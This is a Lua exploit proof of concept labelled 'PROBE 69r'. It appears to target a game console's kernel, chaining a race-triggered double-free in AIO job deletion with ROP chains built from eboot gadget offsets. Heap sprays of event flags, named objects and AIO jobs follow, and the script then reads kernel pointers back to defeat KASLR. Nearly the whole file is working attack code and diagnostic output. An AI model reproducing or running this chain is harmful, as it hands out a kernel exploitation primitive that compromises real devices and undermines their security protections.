-- CRASH_CLASS: HIGH
-- PROBE 69r: Full exploit chain PoC — double-free → spray → readback → KASLR
--
-- Combines all confirmed primitives into one probe:
--   1. Trigger double-free via concurrent 662 (65l pattern)
--   2. Spray EVF + namedobj + AIO re-submit to reclaim freed R slot
--   3. Read back through ALL available interfaces for kernel pointers
--   4. Report KASLR defeat or identify which readback channels work
--
-- R+0x00 = curthread+0x390 (kernel thread address, NOT zeroed before free)
-- R+0x08 = curthread+0x08  (kernel thread address, NOT zeroed before free)
-- R is 48B → 64B UMA bucket (zone 0x1ab59e0 in 13.60)

print("=== PROBE 69r: FULL CHAIN PoC ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local data_buf = memory.alloc(0x1000)
local reqs = memory.alloc(0x30)

local function aio_submit(fd)
    local id_out = memory.alloc(8); wd(N(id_out), 0)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(memory.alloc(8))))
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_out))) end)
    return rd(N(id_out)) or 0
end

local function aio_poll(id)
    local one_id = memory.alloc(8); wd(N(one_id), id)
    local one_st = memory.alloc(8); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- ============================================================
-- PHASE 1: Find a successful double-free
-- ============================================================
print("[1] Triggering double-free")

local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local all_kptrs = {}

local got_doubles = false
local double_count = 0

for attempt = 1, 15 do
    if not alive() then print("  DEAD"); break end

    local ids = {}
    for i = 1, BATCH do
        local id = aio_submit(fd_zero)
        if id ~= 0 then aio_poll(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then break end

    if doubles > 0 then
        double_count = double_count + doubles
        print(string.format("  attempt %d: %d doubles (total %d)", attempt, doubles, double_count))
        got_doubles = true
    end

    -- Keep going to accumulate more doubles before spraying
    if double_count >= 4 then break end
end

if not got_doubles then
    print("  NO DOUBLES after 15 attempts — aborting")
    print("=== PROBE 69r COMPLETE (no doubles) ===")
    return
end

if not alive() then print("DEAD after phase 1"); return end

-- ============================================================
-- PHASE 2: Spray — EVF + namedobj + AIO resubmit
-- ============================================================
print("")
print(string.format("[2] Spraying (accumulated %d doubles)", double_count))

-- EVF spray: 256 objects with sentinel initial_bits
local evf_handles = {}
for i = 1, 256 do
    if not alive() then break end
    local name = put_str(string.format("ev%04d", i))
    local h = nil
    pcall(function() h = mk(538)(uint64(N(name)), uint64(0xCAFE0000 + i)) end)
    if h then
        local hv = N(h)
        if hv > 0 and hv ~= 0xFFFFFFFF then table.insert(evf_handles, hv) end
    end
end
print(string.format("  EVF spray: %d objects", #evf_handles))

if not alive() then print("DEAD after EVF spray"); return end

-- Namedobj spray: 256 objects with 48-byte padded names
local nobj_handles = {}
for i = 1, 256 do
    if not alive() then break end
    -- Pad name to ~48 bytes to match R's 48B allocation
    local name = string.format("nobj_%04d_pad_to_fill_the_48byte_zone_slot", i)
    local np = put_str(name)
    local h = nil
    pcall(function() h = mk(557)(uint64(N(np))) end)
    if h then
        local hv = N(h)
        if hv > 0 and hv ~= 0xFFFFFFFF then table.insert(nobj_handles, hv) end
    end
end
print(string.format("  Namedobj spray: %d objects", #nobj_handles))

if not alive() then print("DEAD after namedobj spray"); return end

-- AIO resubmit: new R objects
local new_aio_ids = {}
for i = 1, 64 do
    if not alive() then break end
    local nid = aio_submit(fd_zero)
    if nid ~= 0 then table.insert(new_aio_ids, nid) end
end
print(string.format("  AIO resubmit: %d new jobs", #new_aio_ids))

if not alive() then print("DEAD after AIO resubmit"); return end

-- ============================================================
-- PHASE 3: Readback through ALL interfaces
-- ============================================================
print("")
print("[3] Readback scan")

-- [3A] EVF poll/wait readback
print("  [3A] EVF trywait readback")
local evf_kptrs = 0

for idx, eh in ipairs(evf_handles) do
    if not alive() then break end

    -- 543(handle, bits, mode) — return value
    local rv = nil
    pcall(function() rv = mk(543)(uint64(eh), uint64(0xFFFFFFFF), uint64(0x10)) end)
    if rv and is_kptr(rv) then
        local h, l = get_hi_lo(rv)
        print(string.format("    *** EVF KPTR 543 handle=0x%X rv: 0x%08X%08X ***", eh, h, l))
        table.insert(all_kptrs, string.format("evf_543_rv handle=0x%X: 0x%08X%08X", eh, h, l))
        evf_kptrs = evf_kptrs + 1
    end

    -- 542(handle, bits, mode, result_ptr, timeout=0) — result buffer
    if idx <= 50 then
        local rbuf = memory.alloc(16)
        wq(N(rbuf), uint64(0))
        pcall(function() mk(542)(uint64(eh), uint64(0xFFFFFFFF), uint64(0x10),
            uint64(N(rbuf)), uint64(0)) end)
        if not alive() then break end

        local rval = rq(N(rbuf))
        if rval and is_kptr(rval) then
            local h, l = get_hi_lo(rval)
            print(string.format("    *** EVF KPTR 542 handle=0x%X result: 0x%08X%08X ***", eh, h, l))
            table.insert(all_kptrs, string.format("evf_542_result handle=0x%X: 0x%08X%08X", eh, h, l))
            evf_kptrs = evf_kptrs + 1
        end
    end
end
print(string.format("  EVF kptrs: %d", evf_kptrs))

if not alive() then print("DEAD after EVF readback"); return end

-- [3B] Namedobj lookup
print("  [3B] Namedobj lookup readback")
local nobj_kptrs = 0

for i = 1, math.min(#nobj_handles, 50) do
    if not alive() then break end
    local name = string.format("nobj_%04d_pad_to_fill_the_48byte_zone_slot", i)
    local np = put_str(name)
    local h = nil
    pcall(function() h = mk(540)(uint64(N(np))) end)
    if h then
        local hv = N(h)
        -- Handle is generation<<13|slot, scan for kernel-shaped return
        if is_kptr(h) then
            local hi, lo = get_hi_lo(h)
            print(string.format("    *** NOBJ KPTR 540 name=%s: 0x%08X%08X ***", name, hi, lo))
            table.insert(all_kptrs, string.format("namedobj_540: 0x%08X%08X", hi, lo))
            nobj_kptrs = nobj_kptrs + 1
        end
    end
end
print(string.format("  Namedobj kptrs: %d", nobj_kptrs))

if not alive() then print("DEAD after namedobj readback"); return end

-- [3C] AIO query on new IDs (should have normal R → check for contamination)
print("  [3C] AIO query on new submissions")
local aio_kptrs = 0

for idx, nid in ipairs(new_aio_ids) do
    if not alive() then break end
    if idx > 32 then break end

    aio_poll(nid)

    local ids_buf = memory.alloc(8); wd(N(ids_buf), nid)
    local st = memory.alloc(64)

    -- 663 wait
    for j = 0, 60, 4 do wd(N(st) + j, 0) end
    pcall(function() mk(663)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
    if not alive() then break end

    for j = 0, 56, 8 do
        local v = rq(N(st) + j)
        if v and is_kptr(v) then
            local h, l = get_hi_lo(v)
            print(string.format("    *** AIO KPTR 663 id=0x%X +%02X: 0x%08X%08X ***", nid, j, h, l))
            table.insert(all_kptrs, string.format("aio_663 id=0x%X +%02X: 0x%08X%08X", nid, j, h, l))
            aio_kptrs = aio_kptrs + 1
        end
    end

    -- 666 status
    for j = 0, 60, 4 do wd(N(st) + j, 0) end
    pcall(function() mk(666)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
    if not alive() then break end

    for j = 0, 56, 8 do
        local v = rq(N(st) + j)
        if v and is_kptr(v) then
            local h, l = get_hi_lo(v)
            print(string.format("    *** AIO KPTR 666 id=0x%X +%02X: 0x%08X%08X ***", nid, j, h, l))
            table.insert(all_kptrs, string.format("aio_666 id=0x%X +%02X: 0x%08X%08X", nid, j, h, l))
            aio_kptrs = aio_kptrs + 1
        end
    end
end
print(string.format("  AIO kptrs: %d", aio_kptrs))

if not alive() then print("DEAD after AIO readback"); return end

-- [3D] sys 624 delta observation during operations
print("  [3D] 624 delta during spray ops")
local pre_624 = nil
pcall(function() pre_624 = mk(624)(uint64(0)) end)

-- Do 32 more EVF creates
for i = 257, 288 do
    local name = put_str(string.format("ex%04d", i))
    pcall(function() mk(538)(uint64(N(name)), uint64(0xBEEF0000 + i)) end)
end

local post_624 = nil
pcall(function() post_624 = mk(624)(uint64(0)) end)
local delta = 0
if pre_624 and post_624 then delta = N(post_624) - N(pre_624) end
print(string.format("  32 more EVF: 624 delta=%d (%.1f per object)", delta,
    delta > 0 and delta / 32 or 0))

-- ============================================================
-- PHASE 4: Cleanup and summary
-- ============================================================
print("")
print("[4] Cleanup")

for _, eh in ipairs(evf_handles) do
    pcall(function() mk(539)(uint64(eh)) end)
end
for _, nh in ipairs(nobj_handles) do
    pcall(function() mk(558)(uint64(nh)) end)
end
for _, nid in ipairs(new_aio_ids) do
    aio_poll(nid)
    local d = memory.alloc(8); wd(N(d), nid)
    local s = memory.alloc(8)
    pcall(function() mk(662)(uint64(N(d)), uint64(1), uint64(N(s))) end)
end

print("")
print("=== SUMMARY ===")
print(string.format("Double-free count: %d", double_count))
print(string.format("EVF spray: %d objects", #evf_handles))
print(string.format("Namedobj spray: %d objects", #nobj_handles))
print(string.format("AIO resubmit: %d jobs", #new_aio_ids))
print(string.format("Total kernel pointers found: %d", #all_kptrs))

if #all_kptrs > 0 then
    print("")
    print("*** KASLR DEFEAT ***")
    for _, desc in ipairs(all_kptrs) do
        print("  " .. desc)
    end
else
    print("")
    print("No kernel pointers found through readback interfaces")
    print("Possible reasons:")
    print("  1. EVF/namedobj/AIO zones don't overlap R's 64B bucket")
    print("  2. 200-256 objects insufficient to drain per-CPU cache (need 4096+)")
    print("  3. AIO query interfaces return only status dwords, not R fields")
    print("  4. Need 3-thread UAF (submit-during-delete) for real dangling reference")
end

print("")
print("=== PROBE 69r COMPLETE ===")
